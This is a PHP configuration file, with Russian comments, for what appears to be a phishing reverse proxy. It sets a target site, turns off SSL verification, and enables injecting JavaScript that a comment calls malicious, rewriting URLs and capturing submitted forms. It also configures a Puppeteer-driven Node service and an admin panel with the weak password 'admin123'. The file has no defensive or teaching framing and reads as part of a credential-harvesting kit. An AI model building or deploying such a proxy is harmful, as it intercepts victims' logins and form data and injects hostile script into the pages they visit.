<?php

return [
    // Основные настройки приложения
    'app' => [
        'debug' => true,
        'log_level' => 'debug', // debug, info, warning, error
    ],
    
    // Настройки Redis
    'redis' => [
        'host' => getenv('REDIS_HOST') ?: 'redis',
        'port' => 6379,
        'database' => 0,
    ],
    
    // Настройки прокси
    'proxy' => [
        'default_target' => 'https://example.com', // Целевой сайт по умолчанию
        'timeout' => 30, // Таймаут в секундах
        'verify_ssl' => false, // Проверка SSL-сертификатов
        'preserve_host' => false, // Сохранять оригинальный заголовок Host
    ],
    
    // Настройки модификации контента
    'content_modifier' => [
        'enabled' => true,
        'inject_js' => true, // Внедрять вредоносный JavaScript
        'replace_urls' => true, // Заменять URL в контенте
        'capture_forms' => true, // Перехватывать формы
    ],
    
    // Настройки Node.js сервиса
    'node' => [
        'url' => 'http://node:3000',
        'puppeteer_enabled' => true,
    ],
    
    // Настройки панели администратора
    'admin' => [
        'password' => 'admin123', // Пароль для входа в панель администратора
        'token_secret' => 'change_this_to_a_random_secret_key', // Секретный ключ для токенов
        'session_lifetime' => 86400, // Время жизни сессии в секундах (24 часа)
    ],
    
    // Пути к директориям
    'paths' => [
        'logs' => '/var/www/html/var/logs',
        'cache' => '/var/www/html/var/cache',
        'sessions' => '/var/www/html/var/sessions',
    ],
];
